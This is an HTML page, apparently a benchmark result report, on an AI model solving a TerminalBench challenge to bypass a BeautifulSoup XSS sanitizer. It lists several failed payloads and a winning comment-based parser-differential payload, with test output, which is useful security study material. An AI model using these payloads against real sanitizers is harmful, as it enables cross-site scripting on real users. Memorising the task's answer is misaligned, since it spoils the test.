@@ -1,0 +1,882 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>XSS Filter Bypass — TerminalBench</title>
+<style>
+:root {
+  --bg: #050911;
+  --bg-panel: #0c1221;
+  --bg-panel-alt: #101828;
+  --border: #1c2d45;
+  --border-dim: #111d2e;
+  --text: #8fa8c4;
+  --text-bright: #d4e4f6;
+  --text-dim: #3d5470;
+  --green: #00e87a;
+  --green-dim: rgba(0, 232, 122, 0.10);
+  --green-glow: 0 0 18px rgba(0, 232, 122, 0.28);
+  --red: #ff4455;
+  --red-dim: rgba(255, 68, 85, 0.09);
+  --amber: #f0b040;
+  --amber-dim: rgba(240, 176, 64, 0.10);
+  --cyan: #22d8f0;
+  --blue: #4488ff;
+  --blue-dim: rgba(68, 136, 255, 0.12);
+  --mono: 'Menlo', 'Monaco', 'Courier New', monospace;
+  --ui: 'Helvetica Neue', 'Arial', sans-serif;
+}
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+html { scroll-behavior: smooth; }
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: var(--mono);
+  font-size: 13px;
+  line-height: 1.75;
+  min-height: 100vh;
+  overflow-x: hidden;
+}
+
+/* CRT scanlines */
+body::before {
+  content: '';
+  position: fixed;
+  inset: 0;
+  background: repeating-linear-gradient(
+    0deg,
+    transparent 0px,
+    transparent 2px,
+    rgba(0,0,0,0.045) 2px,
+    rgba(0,0,0,0.045) 4px
+  );
+  pointer-events: none;
+  z-index: 999;
+}
+
+/* Dot grid */
+body::after {
+  content: '';
+  position: fixed;
+  inset: 0;
+  background-image: radial-gradient(circle, rgba(30,50,80,0.18) 1px, transparent 1px);
+  background-size: 28px 28px;
+  pointer-events: none;
+  z-index: 0;
+}
+
+.wrap {
+  max-width: 900px;
+  margin: 0 auto;
+  padding: 48px 24px 100px;
+  position: relative;
+  z-index: 1;
+}
+
+/* ── Header ─────────────────────────────── */
+.hdr {
+  margin-bottom: 52px;
+  padding-bottom: 36px;
+  border-bottom: 1px solid var(--border-dim);
+  animation: slideDown 0.55s cubic-bezier(0.22,1,0.36,1) both;
+}
+
+.hdr-tags {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 8px;
+  margin-bottom: 22px;
+}
+
+.tag {
+  font-size: 10px;
+  font-family: var(--ui);
+  font-weight: 700;
+  letter-spacing: 0.12em;
+  text-transform: uppercase;
+  padding: 3px 9px;
+  border-radius: 2px;
+}
+
+.tag-bench  { background: var(--blue-dim);  color: var(--blue);  border: 1px solid rgba(68,136,255,0.35); }
+.tag-domain { background: rgba(34,216,240,0.09); color: var(--cyan);  border: 1px solid rgba(34,216,240,0.3); }
+.tag-pass   { background: var(--green-dim); color: var(--green); border: 1px solid rgba(0,232,122,0.35); }
+.tag-id     { background: transparent; color: var(--text-dim); border: 1px solid var(--border-dim); }
+
+h1 {
+  font-family: var(--mono);
+  font-size: 30px;
+  font-weight: bold;
+  letter-spacing: -0.03em;
+  color: var(--text-bright);
+  line-height: 1.15;
+  text-transform: uppercase;
+}
+
+h1 em {
+  font-style: normal;
+  color: var(--green);
+  text-shadow: var(--green-glow);
+}
+
+.subtitle {
+  margin-top: 10px;
+  font-size: 13px;
+  color: var(--text-dim);
+  max-width: 580px;
+  line-height: 1.6;
+}
+
+.stats {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 28px;
+  margin-top: 24px;
+}
+
+.stat-item { display: flex; flex-direction: column; gap: 3px; }
+
+.stat-k {
+  font-family: var(--ui);
+  font-size: 9px;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 0.18em;
+  color: var(--text-dim);
+}
+
+.stat-v {
+  font-size: 14px;
+  font-weight: bold;
+  color: var(--text-bright);
+}
+
+.stat-v.ok { color: var(--green); text-shadow: var(--green-glow); }
+
+/* ── Section chrome ──────────────────────── */
+section { margin-bottom: 44px; }
+
+section:nth-child(1)  { animation: fadeUp 0.5s 0.08s both; }
+section:nth-child(2)  { animation: fadeUp 0.5s 0.16s both; }
+section:nth-child(3)  { animation: fadeUp 0.5s 0.24s both; }
+section:nth-child(4)  { animation: fadeUp 0.5s 0.32s both; }
+section:nth-child(5)  { animation: fadeUp 0.5s 0.40s both; }
+section:nth-child(6)  { animation: fadeUp 0.5s 0.48s both; }
+
+.sec-label {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  font-family: var(--ui);
+  font-size: 10px;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 0.2em;
+  color: var(--text-dim);
+  margin-bottom: 16px;
+}
+
+.sec-label::before {
+  content: '';
+  width: 3px;
+  height: 13px;
+  background: var(--blue);
+  border-radius: 1px;
+  flex-shrink: 0;
+}
+
+/* ── Task panel ─────────────────────────── */
+.task-panel {
+  background: var(--bg-panel);
+  border: 1px solid var(--border);
+  border-left: 3px solid var(--blue);
+  border-radius: 4px;
+  padding: 20px 24px;
+  line-height: 1.85;
+}
+
+.task-panel p { margin-bottom: 10px; }
+.task-panel p:last-child { margin-bottom: 0; }
+.task-panel strong { color: var(--text-bright); }
+.task-panel code {
+  color: var(--amber);
+  background: var(--amber-dim);
+  padding: 1px 5px;
+  border-radius: 2px;
+  font-size: 12px;
+}
+
+/* ── Filter rules ───────────────────────── */
+.filter-card {
+  background: var(--bg-panel);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  overflow: hidden;
+}
+
+.filter-bar {
+  background: var(--bg-panel-alt);
+  border-bottom: 1px solid var(--border);
+  padding: 9px 16px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  font-family: var(--ui);
+  font-size: 10px;
+  font-weight: 600;
+  letter-spacing: 0.12em;
+  text-transform: uppercase;
+  color: var(--text-dim);
+}
+
+.filter-bar::before {
+  content: '';
+  width: 8px;
+  height: 8px;
+  border-radius: 50%;
+  background: var(--amber);
+  flex-shrink: 0;
+}
+
+.filter-rules {
+  padding: 14px 16px;
+  display: flex;
+  flex-direction: column;
+  gap: 8px;
+}
+
+.rule {
+  display: flex;
+  align-items: flex-start;
+  gap: 12px;
+  padding: 10px 14px;
+  background: var(--red-dim);
+  border: 1px solid rgba(255,68,85,0.14);
+  border-radius: 3px;
+}
+
+.rule.note { background: rgba(68,136,255,0.05); border-color: rgba(68,136,255,0.12); }
+
+.rule-icon {
+  font-size: 11px;
+  color: var(--red);
+  width: 16px;
+  flex-shrink: 0;
+  margin-top: 2px;
+  font-weight: bold;
+}
+
+.rule.note .rule-icon { color: var(--blue); }
+
+.rule-text { font-size: 13px; line-height: 1.6; }
+.rule-text code {
+  color: var(--amber);
+  background: var(--amber-dim);
+  padding: 1px 5px;
+  border-radius: 2px;
+  font-size: 12px;
+}
+
+.rule strong { color: var(--text-bright); }
+
+/* ── Timeline ───────────────────────────── */
+.timeline {
+  position: relative;
+  display: flex;
+  flex-direction: column;
+}
+
+.timeline::before {
+  content: '';
+  position: absolute;
+  left: 19px;
+  top: 20px;
+  bottom: 20px;
+  width: 1px;
+  background: linear-gradient(to bottom, transparent, var(--border) 8%, var(--border) 92%, transparent);
+}
+
+.attempt {
+  display: flex;
+  gap: 18px;
+  padding: 6px 0;
+}
+
+.att-num {
+  width: 38px;
+  height: 38px;
+  border-radius: 50%;
+  border: 1px solid rgba(255,68,85,0.4);
+  background: var(--red-dim);
+  color: var(--red);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 10px;
+  font-weight: bold;
+  flex-shrink: 0;
+  position: relative;
+  z-index: 1;
+  font-family: var(--ui);
+}
+
+.att-body { flex: 1; padding: 6px 0 12px; }
+
+.att-label {
+  font-family: var(--ui);
+  font-size: 10px;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 0.12em;
+  color: var(--text-dim);
+  margin-bottom: 5px;
+}
+
+.att-code {
+  font-family: var(--mono);
+  font-size: 12px;
+  color: var(--amber);
+  background: var(--amber-dim);
+  border: 1px solid rgba(240,176,64,0.14);
+  border-radius: 3px;
+  padding: 7px 12px;
+  margin-bottom: 5px;
+  word-break: break-all;
+  line-height: 1.6;
+}
+
+.att-why {
+  font-size: 12px;
+  color: rgba(255,68,85,0.65);
+  line-height: 1.5;
+}
+
+/* ── Breakthrough ───────────────────────── */
+.btk {
+  background: var(--bg-panel);
+  border: 1px solid rgba(0,232,122,0.28);
+  border-radius: 6px;
+  padding: 24px;
+  position: relative;
+  overflow: hidden;
+  box-shadow: var(--green-glow);
+}
+
+.btk::before {
+  content: '';
+  position: absolute;
+  top: 0; left: 0; right: 0;
+  height: 2px;
+  background: linear-gradient(90deg, transparent 0%, var(--green) 40%, var(--green) 60%, transparent 100%);
+  animation: pulse 3s ease-in-out infinite;
+}
+
+@keyframes pulse {
+  0%,100% { opacity: 0.35; }
+  50%      { opacity: 1;    }
+}
+
+.btk-label {
+  font-family: var(--ui);
+  font-size: 10px;
+  font-weight: 700;
+  letter-spacing: 0.2em;
+  text-transform: uppercase;
+  color: var(--green);
+  margin-bottom: 14px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.btk-label::before { content: '▶'; font-size: 9px; }
+
+.payload-display {
+  background: #030508;
+  border: 1px solid rgba(0,232,122,0.18);
+  border-radius: 4px;
+  padding: 16px 20px;
+  font-size: 15px;
+  font-family: var(--mono);
+  line-height: 1.6;
+  word-break: break-all;
+  margin-bottom: 20px;
+  color: #fff;
+}
+
+.p-comment-hook { color: var(--amber); font-weight: bold; }
+.p-tag          { color: var(--cyan); }
+.p-attr         { color: var(--blue); }
+.p-val          { color: var(--green); }
+.p-comment-end  { color: var(--text-dim); }
+
+/* Parser diff table */
+.diff-table {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 12px;
+  margin-bottom: 16px;
+}
+
+.diff-col {
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  overflow: hidden;
+}
+
+.diff-col-hdr {
+  background: var(--bg-panel-alt);
+  padding: 8px 14px;
+  font-family: var(--ui);
+  font-size: 10px;
+  font-weight: 700;
+  letter-spacing: 0.12em;
+  text-transform: uppercase;
+  border-bottom: 1px solid var(--border);
+  display: flex;
+  align-items: center;
+  gap: 7px;
+}
+
+.diff-col-hdr .dot {
+  width: 7px;
+  height: 7px;
+  border-radius: 50%;
+  flex-shrink: 0;
+}
+
+.hdr-bs .dot   { background: var(--amber); }
+.hdr-bw .dot   { background: var(--cyan); }
+.hdr-bs  { color: var(--amber); }
+.hdr-bw  { color: var(--cyan); }
+
+.diff-col-body {
+  padding: 12px 14px;
+  font-size: 12px;
+  line-height: 1.7;
+}
+
+.parse-token {
+  display: inline-block;
+  padding: 1px 6px;
+  border-radius: 2px;
+  margin: 1px 2px;
+  font-family: var(--mono);
+  font-size: 11px;
+}
+
+.tok-comment { background: rgba(240,176,64,0.1); color: var(--amber); border: 1px solid rgba(240,176,64,0.2); }
+.tok-data    { background: rgba(34,216,240,0.08); color: var(--cyan); border: 1px solid rgba(34,216,240,0.2); }
+.tok-skip    { background: rgba(61,84,112,0.3); color: var(--text-dim); border: 1px solid rgba(61,84,112,0.3); text-decoration: line-through; }
+.tok-live    { background: rgba(0,232,122,0.12); color: var(--green); border: 1px solid rgba(0,232,122,0.3); }
+
+.diff-col-body p { margin-top: 8px; font-size: 12px; line-height: 1.6; }
+
+.explain-rows { display: flex; flex-direction: column; gap: 9px; }
+
+.exrow {
+  display: flex;
+  gap: 14px;
+  align-items: flex-start;
+  background: rgba(0,0,0,0.3);
+  border-left: 2px solid var(--cyan);
+  border-radius: 0 3px 3px 0;
+  padding: 10px 14px;
+}
+
+.exrow-num {
+  color: var(--cyan);
+  font-weight: bold;
+  flex-shrink: 0;
+  font-size: 12px;
+  margin-top: 1px;
+  font-family: var(--ui);
+}
+
+.exrow-text {
+  font-size: 13px;
+  line-height: 1.65;
+  color: var(--text);
+}
+
+.exrow-text strong { color: var(--text-bright); }
+.exrow-text code {
+  color: var(--amber);
+  background: var(--amber-dim);
+  padding: 1px 5px;
+  border-radius: 2px;
+  font-size: 12px;
+}
+
+/* ── Terminal ───────────────────────────── */
+.term {
+  background: #020508;
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  overflow: hidden;
+}
+
+.term-bar {
+  background: var(--bg-panel-alt);
+  border-bottom: 1px solid var(--border);
+  padding: 8px 14px;
+  display: flex;
+  align-items: center;
+  gap: 6px;
+}
+
+.d-red    { width: 10px; height: 10px; border-radius: 50%; background: #ff4455; opacity: 0.75; }
+.d-yellow { width: 10px; height: 10px; border-radius: 50%; background: #f0b040; opacity: 0.75; }
+.d-green  { width: 10px; height: 10px; border-radius: 50%; background: #00e87a; opacity: 0.75; }
+.term-name { margin-left: 8px; font-size: 11px; color: var(--text-dim); font-family: var(--ui); }
+
+.term-body {
+  padding: 16px 20px;
+  font-size: 12.5px;
+  line-height: 1.85;
+  font-family: var(--mono);
+}
+
+.t-prompt  { color: var(--text-dim); user-select: none; }
+.t-cmd     { color: var(--cyan); }
+.t-out     { color: var(--text); }
+.t-ok      { color: var(--green); font-weight: bold; }
+.t-err     { color: var(--red); }
+.t-gap     { display: block; height: 6px; }
+
+/* ── Result strip ───────────────────────── */
+.result {
+  display: flex;
+  align-items: center;
+  gap: 16px;
+  padding: 16px 20px;
+  background: var(--green-dim);
+  border: 1px solid rgba(0,232,122,0.28);
+  border-radius: 4px;
+  margin-top: 14px;
+  animation: successPulse 2.5s ease infinite;
+}
+
+@keyframes successPulse {
+  0%,100% { box-shadow: 0 0 0 rgba(0,232,122,0); }
+  50%      { box-shadow: 0 0 18px rgba(0,232,122,0.15); }
+}
+
+.result-icon {
+  width: 34px;
+  height: 34px;
+  border-radius: 50%;
+  background: rgba(0,232,122,0.18);
+  border: 1px solid rgba(0,232,122,0.5);
+  color: var(--green);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 17px;
+  flex-shrink: 0;
+  font-family: var(--ui);
+  font-weight: bold;
+  text-shadow: var(--green-glow);
+}
+
+.result-msg { font-size: 13px; color: var(--text-bright); line-height: 1.6; }
+.result-msg strong { color: var(--green); }
+.result-msg code {
+  color: var(--amber);
+  background: var(--amber-dim);
+  padding: 1px 5px;
+  border-radius: 2px;
+  font-size: 12px;
+}
+
+/* ── Keyframes ──────────────────────────── */
+@keyframes slideDown {
+  from { opacity: 0; transform: translateY(-20px); }
+  to   { opacity: 1; transform: translateY(0); }
+}
+
+@keyframes fadeUp {
+  from { opacity: 0; transform: translateY(14px); }
+  to   { opacity: 1; transform: translateY(0); }
+}
+
+/* ── Scrollbar ──────────────────────────── */
+::-webkit-scrollbar { width: 5px; }
+::-webkit-scrollbar-track { background: var(--bg); }
+::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+
+/* ── Responsive ─────────────────────────── */
+@media (max-width: 640px) {
+  h1 { font-size: 22px; }
+  .diff-table { grid-template-columns: 1fr; }
+  .stats { gap: 18px; }
+}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <!-- ── HEADER ── -->
+  <header class="hdr">
+    <div class="hdr-tags">
+      <span class="tag tag-bench">TerminalBench</span>
+      <span class="tag tag-domain">terminal_devops</span>
+      <span class="tag tag-pass">Solved</span>
+      <span class="tag tag-id">01_break-filter-js-from-html</span>
+    </div>
+    <h1>Break the <em>XSS Filter</em></h1>
+    <p class="subtitle">
+      Bypass a Python HTML sanitizer to auto-execute JavaScript after in-place filtering —
+      exploiting a parser differential between BeautifulSoup and the browser.
+    </p>
+    <div class="stats">
+      <div class="stat-item">
+        <div class="stat-k">Model</div>
+        <div class="stat-v">claude-haiku-4-5</div>
+      </div>
+      <div class="stat-item">
+        <div class="stat-k">Duration</div>
+        <div class="stat-v">223 s</div>
+      </div>
+      <div class="stat-item">
+        <div class="stat-k">Attempts</div>
+        <div class="stat-v">~16</div>
+      </div>
+      <div class="stat-item">
+        <div class="stat-k">Outcome</div>
+        <div class="stat-v ok">PASS</div>
+      </div>
+      <div class="stat-item">
+        <div class="stat-k">Cost</div>
+        <div class="stat-v">$0.31</div>
+      </div>
+    </div>
+  </header>
+
+  <!-- ── CHALLENGE ── -->
+  <section>
+    <div class="sec-label">Challenge</div>
+    <div class="task-panel">
+      <p>
+        The script <code>/app/filter.py</code> attempts to remove JavaScript from HTML files
+        to prevent XSS attacks. It takes an HTML file as a command-line argument and
+        <strong>modifies it in-place</strong>.
+      </p>
+      <p>
+        <strong>Objective:</strong> create <code>/app/out.html</code> such that, even after being
+        processed by <code>filter.py</code>, the file still triggers a JavaScript
+        <code>alert()</code> when opened in a browser — <strong>automatically, without user interaction</strong>.
+      </p>
+      <p>Verification: <code>python /app/test_outputs.py</code></p>
+    </div>
+  </section>
+
+  <!-- ── FILTER RULES ── -->
+  <section>
+    <div class="sec-label">What the Filter Removes</div>
+    <div class="filter-card">
+      <div class="filter-bar">filter.py — sanitization logic (BeautifulSoup)</div>
+      <div class="filter-rules">
+        <div class="rule">
+          <div class="rule-icon">✕</div>
+          <div class="rule-text">
+            All <code>&lt;script&gt;</code> tags and their contents — regardless of <code>type</code> attribute or nesting
+          </div>
+        </div>
+        <div class="rule">
+          <div class="rule-icon">✕</div>
+          <div class="rule-text">
+            Tags: <code>&lt;frame&gt;</code> &nbsp; <code>&lt;iframe&gt;</code> &nbsp; <code>&lt;object&gt;</code> &nbsp; <code>&lt;embed&gt;</code>
+          </div>
+        </div>
+        <div class="rule">
+          <div class="rule-icon">✕</div>
+          <div class="rule-text">
+            Any <strong>attribute whose name starts with <code>on</code></strong> (e.g., <code>onclick</code>, <code>onload</code>, <code>onerror</code>, <code>oninput</code>)
+            via <code>attr.startswith("on")</code>
+          </div>
+        </div>
+        <div class="rule note">
+          <div class="rule-icon" style="color:var(--blue)">→</div>
+          <div class="rule-text" style="color:var(--text-dim)">
+            Iterates <code>soup.find_all(True)</code> — only visits <strong>Tag</strong> nodes.
+            Comment nodes are invisible to the loop.
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ── ATTEMPTS ── -->
+  <section>
+    <div class="sec-label">Exploration — Failed Attempts</div>
+    <div class="timeline">
+
+      <div class="attempt">
+        <div class="att-num">01</div>
+        <div class="att-body">
+          <div class="att-label">SVG onload handler</div>
+          <div class="att-code">&lt;svg onload="alert('XSS')"&gt;&lt;/svg&gt;</div>
+          <div class="att-why">Stripped — "onload" starts with "on"</div>
+        </div>
+      </div>
+
+      <div class="attempt">
+        <div class="att-num">02</div>
+        <div class="att-body">
+          <div class="att-label">Meta refresh with javascript: URL</div>
+          <div class="att-code">&lt;meta http-equiv="refresh" content="0;url=javascript:alert('XSS')"&gt;</div>
+          <div class="att-why">Survives filter, but modern browsers block javascript: in meta refresh</div>
+        </div>
+      </div>
+
+      <div class="attempt">
+        <div class="att-num">03</div>
+        <div class="att-body">
+          <div class="att-label">Mixed-case attribute (onLoad) — case bypass attempt</div>
+          <div class="att-code">&lt;img src="x" onLoad="alert('XSS')"&gt;</div>
+          <div class="att-why">BeautifulSoup normalizes all attribute names to lowercase before checking</div>
+        </div>
+      </div>
+
+      <div class="attempt">
+        <div class="att-num">04</div>
+        <div class="att-body">
+          <div class="att-label">Anchor with javascript: href + autofocus</div>
+          <div class="att-code">&lt;a href="javascript:alert('XSS')" autofocus&gt;Click&lt;/a&gt;</div>
+          <div class="att-why">Survives filter — but autofocus alone does not trigger a link click</div>
+        </div>
+      </div>
+
+      <div class="attempt">
+        <div class="att-num">05</div>
+        <div class="att-body">
+          <div class="att-label">XML namespace prefix (ev:onload)</div>
+          <div class="att-code">&lt;img src="x" ev:onload="alert('XSS')"&gt;</div>
+          <div class="att-why">Bypasses startswith("on") check — attr name is "ev:onload". But browser ignores unknown namespaced attributes on HTML elements</div>
+        </div>
+      </div>
+
+      <div class="attempt">
+        <div class="att-num">06</div>
+        <div class="att-body">
+          <div class="att-label">CSS url() with javascript: protocol</div>
+          <div class="att-code">&lt;style&gt;body { background: url('javascript:alert("XSS")'); }&lt;/style&gt;</div>
+          <div class="att-why">Modern browsers do not execute javascript: in CSS url()</div>
+        </div>
+      </div>
+
+      <div class="attempt">
+        <div class="att-num">07</div>
+        <div class="att-body">
+          <div class="att-label">SVG inline &lt;script&gt; with XML namespace</div>
+          <div class="att-code">&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;&lt;/svg&gt;</div>
+          <div class="att-why">All &lt;script&gt; tags removed regardless of nesting or namespace</div>
+        </div>
+      </div>
+
+      <div class="attempt">
+        <div class="att-num">08</div>
+        <div class="att-body">
+          <div class="att-label">Comment injection — wrong closing sequence</div>
+          <div class="att-code">&lt;!--&gt;&lt;img src=x onerror="alert('XSS')"&gt;&lt;--&gt;</div>
+          <div class="att-why">BS treats as comment, filter skips it, but browser also treats as comment — wrong closing tag &lt;--&gt; instead of --&gt;</div>
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ── BREAKTHROUGH ── -->
+  <section>
+    <div class="sec-label">Breakthrough — Parser Differential</div>
+    <div class="btk">
+      <div class="btk-label">Winning Payload</div>
+
+      <div class="payload-display"><span class="p-comment-hook">&lt;!--&gt;</span><span class="p-tag">&lt;img</span> <span class="p-attr">src</span>=<span class="p-val">x</span> <span class="p-attr">onerror</span>=<span class="p-val">"alert('XSS Bypass!')"</span><span class="p-tag">&gt;</span><span class="p-comment-end">--&gt;</span></div>
+
+      <div class="diff-table">
+        <div class="diff-col">
+          <div class="diff-col-hdr hdr-bs"><div class="dot"></div>BeautifulSoup (Python)</div>
+          <div class="diff-col-body">
+            <span class="parse-token tok-comment">&lt;!-- … --&gt;</span>
+            <p>Entire string is one <strong>Comment node</strong>. Scan of <code>find_all(True)</code> visits only Tag nodes — the comment is invisible. <code>onerror</code> is never found, never removed.</p>
+          </div>
+        </div>
+        <div class="diff-col">
+          <div class="diff-col-hdr hdr-bw"><div class="dot"></div>Browser (HTML5 parser)</div>
+          <div class="diff-col-body">
+            <span class="parse-token tok-comment">&lt;!--&gt;</span>
+            <span class="parse-token tok-live">&lt;img onerror=…&gt;</span>
+            <span class="parse-token tok-skip">--&gt;</span>
+            <p>Per WHATWG spec §comment-start-state, a <code>&gt;</code> immediately after <code>&lt;!--</code> is a parse error that <em>closes the comment</em>. The <code>&lt;img&gt;</code> is real HTML. The trailing <code>--&gt;</code> is ignored.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="explain-rows">
+        <div class="exrow">
+          <div class="exrow-num">①</div>
+          <div class="exrow-text">
+            <strong>Filter pass:</strong> BeautifulSoup sees <code>&lt;!--&gt; … --&gt;</code> as a single comment node
+            and never visits its contents. The payload exits the filter unchanged.
+          </div>
+        </div>
+        <div class="exrow">
+          <div class="exrow-num">②</div>
+          <div class="exrow-text">
+            <strong>Browser parse:</strong> The HTML5 tokenizer's comment-start-state closes the comment
+            on the first <code>&gt;</code>. The subsequent <code>&lt;img src=x onerror="…"&gt;</code>
+            is parsed as a real element.
+          </div>
+        </div>
+        <div class="exrow">
+          <div class="exrow-num">③</div>
+          <div class="exrow-text">
+            <strong>Trigger:</strong> <code>src=x</code> fails to load (no such image path).
+            The <code>onerror</code> event fires immediately, calling <code>alert('XSS Bypass!')</code>
+            — <strong>no user interaction required</strong>.
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ── VERIFICATION ── -->
+  <section>
+    <div class="sec-label">Verification</div>
+    <div class="term">
+      <div class="term-bar">
+        <div class="d-red"></div>
+        <div class="d-yellow"></div>
+        <div class="d-green"></div>
+        <span class="term-name">test_outputs.py</span>
+      </div>
+      <div class="term-body">
+        <div><span class="t-prompt">$ </span><span class="t-cmd">cp /app/out.html /tmp/t.html &amp;&amp; python /app/filter.py /tmp/t.html &amp;&amp; cat /tmp/t.html</span></div>
+        <div class="t-out">&lt;!DOCTYPE html&gt;</div>
+        <div class="t-out">&lt;html&gt;&lt;head&gt;&lt;title&gt;XSS Bypass&lt;/title&gt;&lt;/head&gt;&lt;body&gt;</div>
+        <div class="t-out">&lt;!--&gt;&lt;img src=x onerror="alert('XSS Bypass!')"&gt;--&gt;</div>
+        <div class="t-out">&lt;/body&gt;&lt;/html&gt;</div>
+        <span class="t-gap"></span>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">python -c "from test_outputs import test_out_html_bypasses_filter; test_out_html_bypasses_filter()"</span></div>
+        <div class="t-ok">✓ Alert successfully triggered even after filtering! Text: 'XSS Bypass!'</div>
+      </div>
+    </div>
+    <div class="result">
+      <div class="result-icon">✓</div>
+      <div class="result-msg">
+        <strong>Filter bypassed.</strong> The payload survives sanitization intact and fires
+        <code>alert('XSS Bypass!')</code> automatically when rendered — exploiting the
+        parser differential between Python's BeautifulSoup and the browser's HTML5 tokenizer.
+      </div>
+    </div>
+  </section>
+
+</div>
+</body>
+</html>
